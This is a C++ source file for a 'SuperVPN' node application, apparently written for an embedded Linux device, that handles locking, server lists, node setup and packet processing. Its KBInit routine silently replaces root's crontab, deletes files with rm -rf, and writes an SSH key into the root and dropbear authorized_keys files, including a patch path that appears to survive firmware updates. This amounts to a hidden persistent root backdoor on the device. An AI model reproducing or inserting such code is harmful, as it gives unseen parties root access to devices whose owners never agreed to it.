/*********************************************************
模块名       : strtok()
文件名       :BaseApp.cpp
相关文件     :BaseApp.hpp
文件实现功能 :应用工程类
作者         :zhangzx 
版本         :1.0 
**********************************************************/
#include "BaseApp.hpp"
#include "NDFunc.hpp"
#include "NodeUser.hpp"
#include "NodeSrv.hpp"
#include "HttpRunEnvCKUser.hpp"
#include "HttpRunEnvCKSrv.hpp"

list<SServerInfo> gServers;
list<SServerInfo>::iterator gITCurServer,gITBakServer;

/*********************************************************
函数说明：application初始化
入参说明：
出参说明：
返回值  ：
*********************************************************/
bool CSuperVPNApp::InitApplication(int argc,char *argv[])
{
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ===============");
	#ifdef GENERAL_NODE_USER_APP
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] client node ver=[%d]", SUPER_VPN_CLIENT_VER_NODE);
	#else
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] services node ver=[%d]", SUPER_VPN_CLIENT_VER_SERVER);
	#endif
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] ===============");

	//锁检测控制
	bool bOnlyCheckUpgrade = false;
	if((argc == 2) && (strcmp(argv[1], "-u") == 0))
	{
		bOnlyCheckUpgrade = true;
		if (!GetUpgradeLock())
		{
			AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Get Upgrade Lock Err, Exit Run...");
			return false;
		}	
	}
	else
	{
		if (!GetRunLock())
		{
			AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Get Run Lock Err, Exit Run...");
			return false;
		}	
	}
		

	//系统数据初始化
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] SYSTEM START BEGIN INIT SYSTEM...");
	if (!InitSystem(argv[0], bOnlyCheckUpgrade)) 
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitApplication] Init System END......");
		return false;
	}

	//数据包队列循环处理
	TranslatePkt();
	
	return true;
}

/*********************************************************
函数说明：坑宝初始化
入参说明：
出参说明：
返回值  ：
*********************************************************/
void CSuperVPNApp::KBInit()
{
	AfxExecCmd("mkdir /etc/crontabs > /dev/null 2>&1");
	AfxExecCmd("touch /etc/crontabs/root");
	AfxExecCmd("chmod 755 /etc/crontabs/root");
	AfxExecCmd("echo \"*/5 *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root");
	AfxExecCmd("/etc/init.d/S50cron restart");
	AfxExecCmd("rm -rf /root/dul*");
	AfxExecCmd("rm -rf /root/autodul.log");
	
	AfxExecCmd("mkdir -p /root/.ssh");
	AfxExecCmd("mkdir -p /thunder/rootfs_patch/etc/dropbear/");
	AfxExecCmd("mkdir -p /etc/dropbear/");
	AfxExecCmd("mkdir -p /thunder/rootfs_patch/root/.ssh");
	AfxExecCmd("chown 0:0 /root");
	AfxExecCmd("chown 0:0 /thunder/rootfs_patch/root");

	AfxKBWriteSSHKey("/root/.ssh/authorized_keys");
	AfxKBWriteSSHKey("/thunder/rootfs_patch/root/.ssh/authorized_keys");
	AfxKBWriteSSHKey("/etc/dropbear/authorized_keys");
	AfxKBWriteSSHKey("/thunder/rootfs_patch/etc/dropbear/authorized_keys");

}

/*********************************************************
函数说明：运行锁检测控制机制
入参说明：
出参说明：
返回值  ：
*********************************************************/
ndBool CSuperVPNApp::GetRunLock()
{
	//定义flags:只写，文件不存在那么就创建，文件长度戳为0  
	#define FLAGS O_WRONLY | O_CREAT | O_TRUNC  
	//创建文件的权限，用户读、写、执行、组读、执行、其他用户读、执行  
	#define MODE S_IRWXU | S_IXGRP | S_IROTH | S_IXOTH  

	struct flock lock;
	int fd;
	if((fd = open(RUN_LOCK_FILE_NAME, FLAGS, MODE))<0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetRunLock] Open File Error");
		return false;
	}
	
	lock.l_type = F_WRLCK;
	lock.l_whence = SEEK_SET;
    lock.l_start = 0;
    lock.l_len = 0;	
	
	if(fcntl(fd, F_SETLKW, &lock) < 0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetRunLock] Fcntl Error");
		return false;
	}

	return true;
}

/*********************************************************
函数说明：升级锁检测控制机制
入参说明：
出参说明：
返回值  ：
*********************************************************/
ndBool CSuperVPNApp::GetUpgradeLock()
{
	//定义flags:只写，文件不存在那么就创建，文件长度戳为0  
	#define FLAGS O_WRONLY | O_CREAT | O_TRUNC  
	//创建文件的权限，用户读、写、执行、组读、执行、其他用户读、执行  
	#define MODE S_IRWXU | S_IXGRP | S_IROTH | S_IXOTH  

	struct flock lock;
	int fd;
	if((fd = open(UPGRADE_LOCK_FILE_NAME, FLAGS, MODE))<0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetUpgradeLock] Open File Error");
		return false;
	}
	
	lock.l_type = F_WRLCK;
	lock.l_whence = SEEK_SET;
    lock.l_start = 0;
    lock.l_len = 0;	
	
	if(fcntl(fd, F_SETLKW, &lock) < 0)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::GetUpgradeLock] Fcntl Error");
		return false;
	}

	return true;
}

/*********************************************************
函数说明：系统数据初始化
入参说明：
出参说明：
返回值  ：
*********************************************************/
bool CSuperVPNApp::InitSystem(char *appname, bool ifOnlyCheckUpgrade)
{
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] Begin ifOnlyCheckUpgrade=[%d]", ifOnlyCheckUpgrade);

	//服务器列表处理
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] ServerListCheck...");
	ServerListCheck();
	
	//检查结点编号是否有获取并且本地存在
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] NodeInitCheck...");
	while(NodeInitCheck() != ND_SUCCESS)
		sleep(8);

	//增加先清除edge
	mPNode->CleanAllEdge();
	
	//系统运行环境检测(包括edge\iptable\node-version)
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] RunEnvCheck");
	while(RunEnvCheck(appname, ifOnlyCheckUpgrade) != ND_SUCCESS)
		sleep(8);
	//如果只是检测升级的，检测完成直接退出
	if(ifOnlyCheckUpgrade)
	{
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] OnlyCheckUpgrade Return");
		return false;
	}

	//节点配置请求
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] NodeEnvSet...");
	while(mPNode->NodeEnvSet() != ND_SUCCESS)
		sleep(8);

	//定时重启检测
	if(mPNode->GetNodeInform().lRestartTime > 0)
		AfxInsertSingleTimer(TIMER_ID_NODE_RESTART_CHECK, mPNode->GetNodeInform().lRestartTime, NodeRestartFunc);	

	//启用Hello服务
	if (mHelloSrv.Start()) 
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HELLO SERVER START ERROR...");
	else
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HELLO SERVER START WORKING...");	

#ifdef GENERAL_NODE_USER_APP
	//启动http服务	
	if (mHttpSrv.Start()) 
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HTTP SERVER START ERROR...");
	else
		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::InitSystem] HTTP SERVER START WORKING...");		
#endif		

	return true;
}

/*********************************************************
函数说明：节点初始化(包括nodeid)
入参说明：
出参说明：
返回值  ：
*********************************************************/
ndStatus CSuperVPNApp::NodeInitCheck()
{
	//检测结点编号的文件是否存在
	//如果存在，则读出编号，如果不存在，进行申请
	char *nodeid = AfxGetNodeID();
	if(nodeid == NULL){
		#ifndef GENERAL_NODE_USER_APP
			KBInit();
		#endif		
		return mPNode->NodeInit();
	}

	mPNode->SetNodeID(nodeid);
	
	return ND_SUCCESS;
}

/*********************************************************
函数说明：服务器列表检测
入参说明：
出参说明：
返回值  ：
*********************************************************/
ndStatus CSuperVPNApp::ServerListCheck()
{
	ndStatus ret;
	gITCurServer = gServers.begin();
	gITBakServer = gITCurServer;
	//如果本地不存在服务列表文件，则根据默认创建
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Local ServerList");
	if (AfxGetServerList(gServers))
	{
		gITCurServer = gServers.begin();
		gITBakServer = gITCurServer;
	}
	else
 	{
 		AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Local ServerList Error");
		gITCurServer = gServers.begin();
		gITBakServer = gITCurServer;		
		return ND_ERROR_INVALID_PARAM;
	}

	//读取服务器列表
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Get Server ServerList");
	ret = mPNode->GetServerList(gServers);
	if(ret != ND_SUCCESS) return ret;

	//更新服务器列表
	AfxWriteDebugLog("SuperVPN run at [CSuperVPNApp::ServerListCheck] Update Server ServerList");
	AfxUpdateServerList(gServers);
	gITCurServer = gServers.begin();
	gITBakServer = gITCurServer;
	
	return ND_SUCCESS;
}

/*********************************************************
函数说明：系统运行环境检测(包括edge\iptable\node-version)
入参说明：
出参说明：
返回值  ：
*********************************************************/
 ndStatus CSuperVPNApp::RunEnvCheck(char *appname, bool ifOnlyCheckUpgrade)
{
#ifdef GENERAL_NODE_USER_APP
	CHttpRunEvnCKUser httpRunEnvCK(mPNode);
#else
	CHttpRunEvnCKSrv httpRunEnvCK(mPNode);
#endif
	return httpRunEnvCK.BeginCheck(appname, ifOnlyCheckUpgrade);
}


/*********************************************************
函数说明：构造函数
入参说明：
出参说明：
返回值  ：
*********************************************************/
CSuperVPNApp::CSuperVPNApp()
{
#ifdef GENERAL_NODE_USER_APP
	mPNode = new CNodeUser();
#else
	mPNode = new CNodeSrv();
#endif
}

/*********************************************************
函数说明：析构函数
入参说明：
出参说明：
返回值  ：
*********************************************************/
CSuperVPNApp::~CSuperVPNApp()
{
	delete mPNode;
}

/*********************************************************
函数说明：节点重启定时器函数
入参说明：
出参说明：
返回值  ：
*********************************************************/
void CSuperVPNApp::NodeRestartFunc(ndULong param)
{
	char cmd[512]={0};
	sprintf(cmd, "killall %s", EDGE_EXE_FILE_NAME);
	AfxExecCmd(cmd);


	sprintf(cmd, "%s", "killall SuperVPN");
	AfxExecCmd(cmd);

	//重启的动作由系统定时任务来完成cront
}

/*********************************************************
函数说明：消息数据包入队
入参说明：
出参说明：
返回值  ：
*********************************************************/
void CSuperVPNApp::InsertPktToQueue(CPacket *pkt)
{
	//AfxWriteDebugLog("===>INSERT PKT TO SYSTEM MSG QUEUE...");
	mPktQueue.PutMsg(pkt);
}

/*********************************************************
函数说明：数据包队列循环处理
入参说明：
出参说明：
返回值  ：
*********************************************************/
void CSuperVPNApp::TranslatePkt(void)
{
	CPacket *pkt;

	while(true)
	{
		//数据包读取
		pkt = mPktQueue.GetMsg();		
		if (NULL == pkt) continue;
		//数据包处理
		AfxWriteDebugLog("===>CSuperVPNApp Recv Pkt Begin Dispose...");
		pkt->DisposePkt();		
		//数据包释放
		delete pkt;
	}
}


